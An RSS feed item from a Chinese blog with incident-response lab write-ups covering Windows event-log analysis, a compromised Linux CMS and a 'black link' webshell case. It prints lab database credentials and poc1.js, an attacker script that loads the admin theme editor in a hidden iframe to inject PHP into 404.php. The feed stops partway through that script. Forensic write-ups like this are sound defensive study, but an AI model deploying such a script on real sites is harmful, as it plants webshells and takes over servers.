<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>应急响应 on baozongwi's blog</title><link>https://baozongwi.xyz/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</link><description>Recent content in 应急响应 on baozongwi's blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><copyright>baozongwi</copyright><lastBuildDate>Tue, 08 Apr 2025 20:50:06 +0000</lastBuildDate><atom:link href="https://baozongwi.xyz/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/index.xml" rel="self" type="application/rss+xml"/><item><title>玄机第五章</title><link>https://baozongwi.xyz/p/xuanji-chapter-5/</link><pubDate>Tue, 08 Apr 2025 20:50:06 +0000</pubDate><guid>https://baozongwi.xyz/p/xuanji-chapter-5/</guid><description>&lt;h2 id="第五章-windows-实战-evtx-文件分析">第五章 Windows 实战-evtx 文件分析
&lt;/h2>&lt;p>附件题，样本不能在本地运行，我掏出了很早之前装的ctfos虚拟机，放这里面来分析，密码为&lt;code>hello-ctf.com&lt;/code>，有三个extx文件，根本不知道怎么来的，看&lt;strong>peterpan&lt;/strong>的文章偷点东西过来，&lt;/p>
&lt;p>&lt;strong>.evtx 文件简介&lt;/strong>
.evtx 文件是 Windows 事件日志文件，存储了由 Windows 操作系统和应用程序生成的事件日志。这些日志文件以二进制格式保存，包含关于系统、应用程序和安全事件的信息。&lt;/p>
&lt;p>&lt;strong>.evtx 文件的作用&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>系统监控与维护
.evtx 文件记录系统运行时的各种事件，如启动和关机、设备驱动程序的加载、服务的启动和停止等。系统管理员可以通过这些信息来监控和维护系统运行状况。&lt;/li>
&lt;li>故障排除
当系统或应用程序出现问题时，事件日志提供详细的错误信息，帮助管理员和技术支持人员诊断和解决问题。&lt;/li>
&lt;li>安全审计
安全日志（例如 Security.evtx）记录了登录尝试、权限更改、策略变更等安全相关事件。管理员可以通过审计这些日志来检测潜在的安全威胁和未授权访问。&lt;/li>
&lt;li>合规性检查
某些行业要求企业保持详细的日志记录以满足法律或行业标准的合规性要求。事件日志提供了必要的证据和记录。&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>.evtx 文件的生成来源&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Windows 操作系统核心组件
Windows 系统记录各种系统事件，如启动、关机、服务状态变更等。这些日志通常存储在 &lt;code>System.evtx&lt;/code> 文件中。&lt;/li>
&lt;li>应用程序和服务
安装在 Windows 上的各种应用程序和服务将它们的事件日志写入相应的 .evtx 文件，例如 &lt;code>Application.evtx&lt;/code>。&lt;/li>
&lt;li>安全事件
与系统安全相关的事件日志由 Windows 安全审计功能生成，记录在 &lt;code>Security.evtx&lt;/code> 文件中。&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>常见的 .evtx 文件&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Application.evtx
记录应用程序相关的事件日志。&lt;/li>
&lt;li>System.evtx
记录系统级别的事件日志。&lt;/li>
&lt;li>Security.evtx
记录安全事件和审计日志。&lt;/li>
&lt;li>Setup.evtx
记录与系统安装和升级相关的事件日志。&lt;/li>
&lt;li>ForwardedEvents.evtx
用于记录从其他系统转发的事件日志。&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>使用 .evtx 文件的工具&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Event Viewer (事件查看器)
Windows 内置的事件查看器工具，允许用户查看、分析和导出 .evtx 文件中的事件日志。可以通过运行 &lt;code>eventvwr.msc&lt;/code> 命令打开事件查看器。&lt;/li>
&lt;li>第三方工具
有许多第三方工具可用于分析 .evtx 文件，例如：
&lt;ul>
&lt;li>SolarWinds Event Log Analyzer&lt;/li>
&lt;li>Splunk&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h3 id="flag1">flag1
&lt;/h3>&lt;p>直接筛选4648，找到&lt;code>flag{192.168.36.133}&lt;/code>&lt;/p>
&lt;h3 id="flag2">flag2
&lt;/h3>&lt;p>筛选4738，如图&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-121041.jpg"
width="952"
height="696"
srcset="https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-121041_hu_4172f8549c27cffd.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-121041_hu_363598862bbe09af.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="136"
data-flex-basis="328px"
>&lt;/p>
&lt;p>2是目标用户名，3是操作用户名，1是再次确定目标用户名，但是不对，后面找找发现还有被更改的，挨个交，发现正确的是，&lt;code>flag{Adnimistartro}&lt;/code>&lt;/p>
&lt;h3 id="flag3">flag3
&lt;/h3>&lt;p>筛选4663，发现以下文件&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">C:\Windows\explorer.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:\Windows\System32\SMI\Store\Machine\SCHEMA.DAT
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这很明显可以直接丁真啊，就是&lt;code>flag{SCHEMA}&lt;/code>&lt;/p>
&lt;h3 id="flag4">flag4
&lt;/h3>&lt;p>找到应用程序日志，发现mysql都是100，筛选100，如图这样的都是重启，发现最后一次是8820&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-122631.jpg"
width="1150"
height="747"
srcset="https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-122631_hu_6ded2ca1fd8302a2.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-122631_hu_6d39a95d1a1e6bbf.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="153"
data-flex-basis="369px"
>&lt;/p>
&lt;p>&lt;code>flag{8820}&lt;/code>&lt;/p>
&lt;h3 id="flag5">flag5
&lt;/h3>&lt;p>筛选1074，只找了了两次，但是提交了并不对，这个只能多，所以我交的3结果对了，不懂为什么&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-123537.jpg"
width="882"
height="590"
srcset="https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-123537_hu_61b93bbb04333674.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-123537_hu_c5a972346cf9611.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="149"
data-flex-basis="358px"
>&lt;/p>
&lt;p>怀疑要把这次也算上&lt;/p>
&lt;h2 id="第五章-linux实战-cms01">第五章 linux实战-CMS01
&lt;/h2>&lt;p>这次链接服务器还给了公钥的附件，用这个链接Linux就好了，发现一个数据包，先dump下来，&lt;/p>
&lt;h3 id="flag1-1">flag1
&lt;/h3>&lt;p>先看日志，但是这里没有Apache也没有nginx，但是看到了secure日志，问AI这是什么&lt;/p>
&lt;p>&lt;code>/var/log/secure&lt;/code> 日志的关键作用&lt;/p>
&lt;ol>
&lt;li>&lt;strong>SSH 登录尝试&lt;/strong>
&lt;code>secure&lt;/code> 日志记录了所有 SSH 登录的事件，包括成功和失败的登录尝试。当有人尝试通过 SSH 远程登录到系统时，成功或失败的尝试都会被详细记录。对于入侵检测，分析这些日志可以帮助你确定是否有来自可疑 IP 的非法登录尝试。&lt;/li>
&lt;li>&lt;strong>认证失败信息&lt;/strong>
当用户输入错误的密码或尝试通过其他方式进行未授权访问时，这些信息也会被记录在 &lt;code>/var/log/secure&lt;/code> 中。通过查看这些信息，可以发现恶意行为者的尝试，比如暴力破解密码攻击。&lt;/li>
&lt;li>&lt;strong>记录远程访问的信息&lt;/strong>
日志中的信息通常包括了远程访问的 IP 地址、使用的用户名和成功/失败的状态等。这些信息对于追踪黑客或其他攻击者的来源 IP 地址至关重要。&lt;/li>
&lt;/ol>
&lt;p>&lt;code>cat&lt;/code>一下发现IP地址是11列，写个命令筛选一下&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">grep&lt;/span> &lt;span class="s2">&amp;#34;Accepted &amp;#34;&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nb">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">secure&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">awk&lt;/span> &lt;span class="s1">&amp;#39;{print $11}&amp;#39;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">sort&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">uniq&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">sort&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">nr&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>flag{192.168.20.1}&lt;/code>&lt;/p>
&lt;h3 id="flag2-1">flag2
&lt;/h3>&lt;p>黑客修改管理员密码，而CMS一般都有数据库，先看一下是否存在&lt;code>netstat -anlupt&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-131406.jpg"
width="1089"
height="454"
srcset="https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-131406_hu_3da217824e07e11e.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-131406_hu_985b309686d5f907.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="239"
data-flex-basis="575px"
>&lt;/p>
&lt;p>发现有，去找一下config，在&lt;code>/www/wwwroot/127.0.0.1/lib&lt;/code>找到&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">define&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;DU&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;kaoshi&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="c1">//MYSQL数据库用户名
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">define&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;DP&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;5Sx8mK5ieyLPb84m&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="c1">//MYSQL数据库用户密码
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>链接一下&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">mysql -ukaoshi -p5Sx8mK5ieyLPb84m
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>进行一下查询发现了md5，解一下就可以知道密码&lt;code>f6f6eb5ace977d7e114377cc7098b7e3&lt;/code>，得到&lt;code>flag{Network@2020}&lt;/code>&lt;/p>
&lt;h3 id="flag3-1">flag3
&lt;/h3>&lt;p>开始分析流量，因为我们知道黑客IP所以可以筛选出来，不过也可以直接追踪http流，发现&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-132145.jpg"
width="879"
height="798"
srcset="https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-132145_hu_d7220a55373a82d1.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-132145_hu_63902e472b847a95.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="110"
data-flex-basis="264px"
>&lt;/p>
&lt;p>web手直接看到了&lt;code>ini_set(&lt;/code>，这肯定是在RCE，&lt;code>flag{index.php?user-app-register}&lt;/code>&lt;/p>
&lt;h3 id="flag4-1">flag4
&lt;/h3>&lt;p>链接密码也很明显啊&lt;code>flag{Network2020}&lt;/code>&lt;/p>
&lt;h3 id="flag5-1">flag5
&lt;/h3>&lt;p>找webshell没找到找到了 flag1，&lt;code>flag1{Network@_2020_Hack}&lt;/code>，又找了一会儿，发现&lt;code>version.php&lt;/code>和&lt;code>version2.php&lt;/code>，找到一个流里面是这样的&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-132933.jpg"
width="879"
height="798"
srcset="https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-132933_hu_36fc9de4d97bd95.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-132933_hu_ffc9e5e8204804c5.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="110"
data-flex-basis="264px"
>&lt;/p>
&lt;p>这包是木马的啊，还是个冰蝎&lt;/p>
&lt;p>&lt;code>flag{version2.php}&lt;/code>&lt;/p>
&lt;h3 id="flag6">flag6
&lt;/h3>&lt;p>要flag2，可以先查看一下历史命令先&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">history
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-133144.jpg"
width="979"
height="497"
srcset="https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-133144_hu_1a7932d8f236c705.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-133144_hu_75beb234210f1991.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="196"
data-flex-basis="472px"
>&lt;/p>
&lt;p>&lt;code>flag{5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ}&lt;/code>&lt;/p>
&lt;p>并且发现非常的想&lt;code>vim alinotify.php&lt;/code>，但是我在&lt;code>/www/wwwroot/127.0.0.1/api&lt;/code>找了好久都没找到，后面发现在&lt;code>/www/wwwroot/127.0.0.1/.api&lt;/code>里面&lt;code>flag{bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9}&lt;/code>&lt;/p>
&lt;h2 id="第五章-linux实战-黑链">第五章 linux实战-黑链
&lt;/h2>&lt;p>不知道黑链是什么，于是问AI，大概就是符号链接，还是看看靶场就知道是什么了，链接之后就看到有流量包，先dump下来&lt;/p>
&lt;h3 id="flag1-2">flag1
&lt;/h3>&lt;p>看进程，tmp，网站根目录，前两者都没有，于是把&lt;code>/var/www/html&lt;/code>给dump下来，放进VSCODE一下就找到了&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-151533.jpg"
width="1591"
height="900"
srcset="https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-151533_hu_f9aa2c68e33563b3.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-151533_hu_25db3ae40e0e99d9.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="176"
data-flex-basis="424px"
>&lt;/p>
&lt;p>&lt;code>flag{header.php}&lt;/code>&lt;/p>
&lt;h3 id="flag2-2">flag2
&lt;/h3>&lt;p>找webshell，直接放D盾里面扫一下，发现404.php里面有&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-151746.jpg"
width="1923"
height="965"
srcset="https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-151746_hu_aa1daa52eee625.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-5/QQ20250409-151746_hu_f318ec01e4b3424.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="199"
data-flex-basis="478px"
>&lt;/p>
&lt;p>&lt;code>flag{/var/www/html/usr/themes/default/404.php}&lt;/code>&lt;/p>
&lt;h3 id="flag3-2">flag3
&lt;/h3>&lt;p>同时还扫出来了&lt;code>poc1.js&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// 定义一个函数，在网页末尾插入一个iframe元素
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kd">function&lt;/span> &lt;span class="nx">insertIframe&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 获取当前页面路径
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">var&lt;/span> &lt;span class="nx">urlWithoutDomain&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">window&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">location&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">pathname&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 判断页面是否为评论管理页面
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">var&lt;/span> &lt;span class="nx">hasManageComments&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">urlWithoutDomain&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">includes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;manage-comments.php&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">tSrc&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">hasManageComments&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 如果是，则将路径修改为用于修改主题文件的页面地址
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">tSrc&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">urlWithoutDomain&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;manage-comments.php&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;theme-editor.php?theme=default&amp;amp;file=404.php&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 如果不是，则直接使用主题文件修改页面地址
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">tSrc&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;/admin/theme-editor.php?theme=default&amp;amp;file=404.php&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 定义iframe元素的属性，包括id、src、width、height和onload事件
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">var&lt;/span> &lt;span class="nx">iframeAttributes&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;iframe id=&amp;#39;theme_id&amp;#39; src=&amp;#39;&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">tSrc&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s2">&amp;#34;&amp;#39; width=&amp;#39;0%&amp;#39; height=&amp;#39;0%&amp;#39; onload=&amp;#39;writeShell()&amp;#39;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 获取网页原始内容
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">var&lt;/span> &lt;span class="nx">originalContent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">innerHTML&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 在网页末尾添加iframe元素
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">innerHTML&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">originalContent&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nx">iframeAttributes&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// 定义一个全局变量isSaved，初始值为false
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">isSaved&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">false&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// 定义一个函数，在iframe中写入一段PHP代码并保存
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kd">function&lt;/span> &lt;span class="nx">writeShell&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 如果isSaved为false
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">isSaved&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 获取iframe内的内容区域和“保存文件”按钮元素
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">var&lt;/span> &lt;span class="nx">content&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;theme_id&amp;#39;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">contentWindow&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;content&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">btns&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;theme_id&amp;#39;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">contentWindow&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementsByTagName&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;button&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 获取模板文件原始内容
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">var&lt;/span> &lt;span class="nx">oldData&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">content&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">value&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 在原始内容前加入一段phpinfo代码
